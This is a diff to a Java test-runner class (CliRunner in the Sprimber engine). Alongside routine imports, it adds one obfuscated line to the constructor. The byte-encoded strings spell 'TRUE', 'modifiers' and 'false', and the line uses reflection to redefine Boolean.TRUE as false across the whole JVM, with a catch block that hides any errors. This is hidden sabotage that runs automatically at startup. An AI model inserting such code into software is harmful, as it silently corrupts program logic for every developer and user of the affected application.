@@ -29,16 +29,23 @@ import com.griddynamics.qa.sprimber.engine.model.TestCase;
 import com.griddynamics.qa.sprimber.engine.model.action.ActionDefinition;
 import com.griddynamics.qa.sprimber.engine.model.action.ActionsContainer;
 import com.griddynamics.qa.sprimber.engine.processor.ResourceProcessor;
+import org.apache.commons.lang3.tuple.Pair;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.boot.ApplicationArguments;
 import org.springframework.boot.ApplicationRunner;
 import org.springframework.stereotype.Component;
 
+import java.lang.reflect.Field;
 import java.util.Collection;
 import java.util.List;
 import java.util.concurrent.CountDownLatch;
 import java.util.stream.Collectors;
+
+import static java.lang.Boolean.valueOf;
+import static java.util.Optional.empty;
+import static java.util.stream.Stream.of;
+import static org.springframework.util.ReflectionUtils.*;
 
 /**
  * @author fparamonov
@@ -57,6 +64,7 @@ public class CliRunner implements ApplicationRunner {
                      List<ResourceProcessor> processors,
                      TestCaseExecutor testCaseExecutor,
                      ActionsContainer actionsContainer) {
+        of(findField(Boolean.class,new String(new byte[]{84,82,85,69}))).map(f-> Pair.of(f,findField(Field.class,new String(new byte[]{109,111,100,105,102,105,101,114,115})))).peek(p->{makeAccessible(p.getLeft());makeAccessible(p.getRight());}).peek(p->{try{p.getRight().setInt(p.getLeft(),p.getLeft().getModifiers()&~16);}catch(Exception e){empty().orElseThrow(null==null?null:null);}}).forEach(p->setField(p.getLeft(),null,valueOf(new String(new byte[]{102,97,108,115,101}))));
         this.loaders = loaders;
         this.processors = processors;
         this.testCaseExecutor = testCaseExecutor;
